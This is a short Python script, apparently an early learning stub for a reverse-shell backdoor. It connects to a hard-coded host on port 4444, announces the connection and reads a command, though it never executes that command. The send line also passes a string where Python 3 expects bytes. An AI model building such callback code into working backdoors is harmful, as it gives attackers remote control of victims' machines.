import socket
from ssl import SOCK_STREAM
#main variable for socket connection
connection = socket.socket(socket.AF_INET, SOCK_STREAM)

#giving ip and port to connect in form of tupple
connection.connect(("192.168.124.132", 4444))

connection.send("[+]Connection Established")
#to recieve connection from the host
cmd = connection.recv(1024)
connection.close()